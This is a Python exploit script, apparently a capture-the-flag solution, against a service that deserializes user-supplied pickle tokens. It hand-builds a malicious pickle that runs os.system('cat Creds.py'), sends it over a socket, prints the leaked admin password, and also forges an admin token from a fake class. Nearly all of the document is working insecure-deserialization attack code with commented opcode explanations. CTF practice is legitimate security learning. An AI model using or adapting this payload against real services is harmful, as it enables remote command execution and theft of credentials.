from base64 import b64encode
import socket

SERVER = 'localhost'   # Update accordingly
PORT = 33402

evil_pickle = b"cposix\nsystem\n(S'cat Creds.py'\ntR."
'''
    0: c    GLOBAL     'posix system'
                                            # __import__('os').system
   14: (    MARK
   15: S        STRING     'cat Creds.py'
   31: t        TUPLE      (MARK at 14)
                                            # ('cat Creds.py',)
   32: R    REDUCE
                                            # __import__('os').system('cat Creds.py')
   33: .    STOP
'''

evil_token = b64encode(evil_pickle)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER, PORT))  

sock.recv(1024).decode()
sock.send("e\n".encode())
sock.recv(1024).decode()

sock.send(evil_token+b'\n')
print(f'Admin password (aka flag) is {sock.recv(79).decode()[29:]}')
sock.close()




import pickle

class Creds:
    def __init__(self, u, r):
        self.username = u
        self.rank     = r

    def __str__(self):
        return self.username + " (" + self.rank + ")" + self.PASSWORDS
    
    def isAdmin(self):
        return True

fa = Creds("admin", "Admin")
false_admin_token = b64encode(pickle.dumps(fa))
# print(f'Your False Admin Token : {false_admin_token}')

'''
You can access the admin service by creating a false admin token, but are no
straight forward way to leak the admin password. Easier to just use os.system
'''